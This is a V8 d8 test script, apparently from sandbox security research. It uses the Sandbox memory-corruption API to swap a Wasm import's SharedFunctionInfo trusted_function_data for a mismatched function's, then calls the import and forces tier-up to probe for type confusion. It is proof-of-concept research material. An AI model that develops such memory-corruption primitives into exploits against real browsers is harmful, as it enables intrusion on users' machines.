// C21 H32: mutate SharedFunctionInfo.trusted_function_data after import.
//
// Upstream race mutates trusted_function_data during instantiation. This
// non-racy variant mutates after import dispatch state is installed, then calls
// the imported function and forces wrapper tier-up. It checks whether later
// call/tier-up rereads SFI trusted_function_data or uses copied import state.

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

let builder = new WasmModuleBuilder();
builder.exportMemoryAs('mem0', 0);
builder.addMemory(1, 1);
builder.addFunction('writer', kSig_v_i).exportFunc().addBody([
  kExprLocalGet, 0,
  ...wasmI32Const(0x32323232),
  kExprI32StoreMem, 0, 0,
]);
builder.addFunction('dummy', kSig_v_l).exportFunc().addBody([]);
let exporter = builder.instantiate();
let {writer, dummy} = exporter.exports;

builder = new WasmModuleBuilder();
let imp = builder.addImport('imp', 'writer', kSig_v_i);
builder.addFunction('call', kSig_v_i).exportFunc().addBody([
  kExprLocalGet, 0,
  kExprCallFunction, imp,
]);
let importer = builder.instantiate({imp: {writer}});

const kHeapObjectTag = 1;
const kJSFunctionType = Sandbox.getInstanceTypeIdFor('JS_FUNCTION_TYPE');
const kSharedFunctionInfoType =
    Sandbox.getInstanceTypeIdFor('SHARED_FUNCTION_INFO_TYPE');
const kJSFunctionSFIOffset =
    Sandbox.getFieldOffset(kJSFunctionType, 'shared_function_info');
const kSharedFunctionInfoTrustedFunctionDataOffset =
    Sandbox.getFieldOffset(kSharedFunctionInfoType, 'trusted_function_data');
const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}

function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}

function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

let mem32 = new Uint32Array(exporter.exports.mem0.buffer);
importer.exports.call(0);
print(`before_mem0=0x${mem32[0].toString(16)}`);

let writerSfi = getField(getPtr(writer), kJSFunctionSFIOffset);
let dummySfi = getField(getPtr(dummy), kJSFunctionSFIOffset);
let dummyTfd = getField(dummySfi, kSharedFunctionInfoTrustedFunctionDataOffset);
setField(writerSfi, kSharedFunctionInfoTrustedFunctionDataOffset, dummyTfd);

mem32[0] = 0;
try {
  importer.exports.call(0);
  print(`after_mut_call_mem0=0x${mem32[0].toString(16)}`);
} catch (e) {
  print(`after_mut_call_throw=${e.name}:${e.message}`);
}

try {
  %WasmTierUpFunction(importer.exports.call);
  mem32[0] = 0;
  importer.exports.call(0);
  print(`after_tierup_mem0=0x${mem32[0].toString(16)}`);
} catch (e) {
  print(`after_tierup_throw=${e.name}:${e.message}`);
}
